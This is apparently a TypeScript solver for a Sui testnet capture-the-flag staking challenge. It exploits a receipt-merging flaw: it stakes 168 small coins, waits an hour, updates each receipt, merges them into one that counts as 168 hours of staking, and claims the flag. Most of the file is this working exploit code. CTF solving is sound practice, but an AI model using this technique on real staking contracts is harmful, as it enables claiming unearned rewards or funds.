import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from '../keypair.json' with { type: 'json' };

/**
 * Staking Challenge: stake ≥1 SUI for ≥168 hours (1 week), then claim the flag.
 *
 * Exploit: Split 1 SUI into 168 coins, stake each → 168 receipts. After 1 real hour,
 * update each receipt (+1 hour), merge all 168 into one (168 hours, 1 SUI), then claim.
 *
 * Set the StakingPool object ID below (or use env STAKING_POOL_ID).
 * Find it: Sui testnet explorer → package 0xd56e50... → object type ctf::staking::StakingPool.
 */
const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
  network: 'testnet',
  baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const CTF_PACKAGE_ID = '0xd56e5075ba297f9e37085a37bb0abba69fabdf9987f8f4a6086a3693d88efbfd';
const MIN_STAKE_MIST = 1_000_000_000; // 1 SUI
const MIN_STAKE_HOURS = 168;
/** Explicit gas budget (Phase 1 needs ~0.41 SUI for 168 stakes). Prevents SDK from failing gas selection when coins are split. */
const GAS_BUDGET = 450_000_000; // 0.45 SUI
const STAKE_RECEIPT_TYPE = `${CTF_PACKAGE_ID}::staking::StakeReceipt`;
const STAKING_POOL_TYPE = `${CTF_PACKAGE_ID}::staking::StakingPool`;

/** StakingPool shared object ID. Set here or export STAKING_POOL_ID. Left empty to auto-discover via GraphQL. */
const STAKING_POOL_ID = '';

const SUI_GRAPHQL_TESTNET = 'https://graphql.testnet.sui.io/graphql';

/** Resolve pool ID from constant/env, or by querying GraphQL for objects of type StakingPool. */
async function getStakingPoolId(): Promise<string> {
  const id = (STAKING_POOL_ID || process.env.STAKING_POOL_ID)?.trim();
  if (id) return id;

  try {
    const res = await fetch(SUI_GRAPHQL_TESTNET, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        query: `query($filter: ObjectFilter!) {
          objects(first: 5, filter: $filter) {
            nodes { address }
          }
        }`,
        variables: {
          filter: { type: STAKING_POOL_TYPE },
        },
      }),
    });
    const json = (await res.json()) as {
      data?: { objects?: { nodes?: { address: string }[] } };
      errors?: { message: string }[];
    };
    if (json.errors?.length) throw new Error(json.errors[0].message);
    const nodes = json.data?.objects?.nodes ?? [];
    if (nodes.length > 0) return nodes[0].address;
  } catch (e) {
    // fall through to throw below
  }

  throw new Error(
    'Could not find StakingPool. Set STAKING_POOL_ID at the top of this file or export it.\n' +
      `  Find the object (type ${STAKING_POOL_TYPE}) in Sui testnet explorer → package ${CTF_PACKAGE_ID} → Transaction Blocks → publish tx → Created objects.`
  );
}

/** 168 amounts that sum to exactly 1 SUI (1e9 MIST) */
function splitAmounts(): number[] {
  const total = MIN_STAKE_MIST;
  const base = Math.floor(total / MIN_STAKE_HOURS);
  const remainder = total - MIN_STAKE_HOURS * base;
  const amounts: number[] = [];
  for (let i = 0; i < MIN_STAKE_HOURS; i++) {
    amounts.push(i < remainder ? base + 1 : base);
  }
  return amounts;
}

type CoinRef = { objectId: string; version: string; digest: string; balance: number };

/** Returns coins with refs (objectId, version, digest), so we can set gas payment explicitly. */
async function getSuiCoinsForStake(
  sender: string,
  minTotalBalance: number
): Promise<{ single: CoinRef } | { coins: CoinRef[] }> {
  const { objects: coins } = await suiClient.listCoins({
    owner: sender,
    coinType: '0x2::sui::SUI',
    limit: 100,
  });
  if (coins.length === 0) {
    throw new Error(
      `No SUI coins found. Total need: ${minTotalBalance} MIST (${minTotalBalance / 1e9} SUI). Get testnet SUI from faucet.`
    );
  }
  const withRef = coins.map((c) => ({
    objectId: c.objectId,
    version: c.version,
    digest: c.digest,
    balance: Number(c.balance),
  }));
  const total = withRef.reduce((s, c) => s + c.balance, 0);
  if (total < minTotalBalance) {
    throw new Error(
      `Total SUI balance ${total} MIST (${(total / 1e9).toFixed(2)} SUI) is below required ${minTotalBalance} MIST (${minTotalBalance / 1e9} SUI). Get testnet SUI from faucet.`
    );
  }
  const byBalance = withRef.sort((a, b) => b.balance - a.balance);
  // Only treat as "single coin" when we have exactly one coin. With 2+ coins we use one for gas and the rest for staking.
  const single =
    withRef.length === 1 && byBalance[0].balance >= minTotalBalance ? byBalance[0] : null;
  if (single) return { single };
  return { coins: byBalance };
}

async function getStakeReceiptIds(sender: string, limit: number): Promise<string[]> {
  const { objects } = await suiClient.listOwnedObjects({
    owner: sender,
    type: STAKE_RECEIPT_TYPE,
    limit,
  });
  return objects.map((o) => o.objectId);
}

(async () => {
  const sender = keypair.getPublicKey().toSuiAddress();
  const poolId = await getStakingPoolId();

  const receiptIds = await getStakeReceiptIds(sender, MIN_STAKE_HOURS + 10);

  if (receiptIds.length >= MIN_STAKE_HOURS) {
    // Phase 2: update all 168 receipts, merge into one, claim_flag
    const ids = receiptIds.slice(0, MIN_STAKE_HOURS);
    const { objects: gasCoins } = await suiClient.listCoins({
      owner: sender,
      coinType: '0x2::sui::SUI',
      limit: 1,
    });
    const tx = new Transaction();
    tx.setSender(sender);
    tx.setGasOwner(sender);
    tx.setGasBudget(GAS_BUDGET);
    if (gasCoins.length > 0) {
      tx.setGasPayment([{ objectId: gasCoins[0].objectId, version: gasCoins[0].version, digest: gasCoins[0].digest }]);
    }
    const pool = tx.object(poolId);
    const clock = tx.object.clock();

    const receiptRefs = ids.map((id) => tx.object(id));
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const updated: any[] = [];
    for (let i = 0; i < MIN_STAKE_HOURS; i++) {
      const [r] = tx.moveCall({
        target: `${CTF_PACKAGE_ID}::staking::update_receipt`,
        arguments: [receiptRefs[i], clock],
      });
      updated.push(r);
    }

    let merged = updated[0];
    for (let i = 1; i < MIN_STAKE_HOURS; i++) {
      const [m] = tx.moveCall({
        target: `${CTF_PACKAGE_ID}::staking::merge_receipts`,
        arguments: [merged, updated[i], clock],
      });
      merged = m;
    }

    const [flag, stakedCoin] = tx.moveCall({
      target: `${CTF_PACKAGE_ID}::staking::claim_flag`,
      arguments: [pool, merged, clock],
    });

    tx.transferObjects([flag], sender);
    tx.transferObjects([stakedCoin], sender);

    try {
      const result = await suiClient.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
        include: { effects: true },
      });

      if (result.$kind === 'FailedTransaction') {
        const status = (result.FailedTransaction.status as { error?: { message?: string } })?.error?.message ?? '';
        if (status.includes('ENotEnoughStakingTime') || (status.includes('staking') && status.includes('0'))) {
          console.log('Not 1 hour yet. Wait 1 hour from when you staked, then run: pnpm staking');
          process.exit(1);
        }
        throw new Error(`claim_flag failed: ${status}`);
      }

      console.log('Flag claimed successfully.');
      console.log('Transaction digest:', result.Transaction.digest);
      return;
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      const notEnoughTime =
        msg.includes('NotEnoughStakingTime') || (msg.includes('staking') && msg.includes('abort'));
      if (notEnoughTime) {
        console.log('Not enough staking time yet. Wait 1 hour from staking, then run: pnpm staking');
        process.exit(1);
      }
      throw err;
    }
  }

  // Phase 1: split 1 SUI into 168 coins, stake each → 168 receipts
  // Sui rule: a mutable object cannot appear twice in one tx. So we use one coin for gas and a different coin for staking.
  const amounts = splitAmounts();
  const totalNeeded = MIN_STAKE_MIST + GAS_BUDGET; // 1 SUI to stake + gas
  const coinsForStake = await getSuiCoinsForStake(sender, totalNeeded);

  const tx = new Transaction();
  tx.setSender(sender);
  tx.setGasOwner(sender);
  tx.setGasBudget(GAS_BUDGET);

  let coinRef: Parameters<Transaction['splitCoins']>[0];
  if ('single' in coinsForStake) {
    // Sui forbids using the same mutable object twice in one tx (gas + split). We need 2+ coins.
    const coinId = coinsForStake.single.objectId;
    throw new Error(
      `You have only one SUI coin. We need one for gas and one for staking.\n\n` +
        `Option A – Request more SUI from the faucet 2–3 times: https://faucet.sui.io\n` +
        `  Each request may create a new coin. Then run: pnpm staking\n\n` +
        `Option B – If you have the Sui CLI installed, split your coin:\n` +
        `  sui client pay-sui --input-coins ${coinId} --recipients ${sender} --amounts 450000000 --gas-budget 50000000\n` +
        `  Then run: pnpm staking\n\n` +
        `Install Sui CLI: cargo install --locked --git https://github.com/MystenLabs/sui.git sui`
    );
  } else {
    const list = coinsForStake.coins;
    // Use the smallest coin that covers gas for gas, so the rest (largest coins) are left for staking.
    const gasEligible = list.filter((c) => c.balance >= GAS_BUDGET);
    const gasRef =
      gasEligible.length > 0 ? gasEligible.reduce((min, c) => (c.balance < min.balance ? c : min)) : null;
    const stakeRefs = gasRef ? list.filter((c) => c.objectId !== gasRef.objectId) : list;
    if (gasRef) {
      tx.setGasPayment([{ objectId: gasRef.objectId, version: gasRef.version, digest: gasRef.digest }]);
    }
    const stakeTotal = stakeRefs.reduce((s, c) => s + c.balance, 0);
    if (stakeRefs.length === 0 || stakeTotal < MIN_STAKE_MIST) {
      throw new Error(
        `Need 1 SUI in coins not used for gas. You have ${stakeRefs.length} coin(s) for staking (total ${stakeTotal} MIST). ` +
          `Have at least 2 SUI coins: one >= ${(GAS_BUDGET / 1e9).toFixed(2)} SUI for gas and others totaling >= 1 SUI for stake.`
      );
    }
    coinRef = tx.object(stakeRefs[0].objectId);
    if (stakeRefs.length > 1) {
      tx.mergeCoins(coinRef, stakeRefs.slice(1).map((c) => tx.object(c.objectId)));
    }
  }

  const coins = tx.splitCoins(coinRef, amounts);
  const pool = tx.object(poolId);
  const clock = tx.object.clock();

  const receipts: Parameters<Transaction['transferObjects']>[0] = [];
  for (let i = 0; i < MIN_STAKE_HOURS; i++) {
    const [receipt] = tx.moveCall({
      target: `${CTF_PACKAGE_ID}::staking::stake`,
      arguments: [pool, coins[i], clock],
    });
    receipts.push(receipt);
  }

  tx.transferObjects(receipts, sender);

  const result = await suiClient.signAndExecuteTransaction({
    signer: keypair,
    transaction: tx,
    include: { effects: true },
  });

  if (result.$kind === 'FailedTransaction') {
    const status = (result.FailedTransaction.status as { error?: { message?: string } })?.error?.message ?? '';
    throw new Error(`stake failed: ${status}`);
  }

  console.log(`Staked 168 coins (1 SUI total). You now have ${MIN_STAKE_HOURS} StakeReceipts.`);
  console.log('Wait 1 hour, then run: pnpm staking');
  console.log('Transaction digest:', result.Transaction.digest);
})();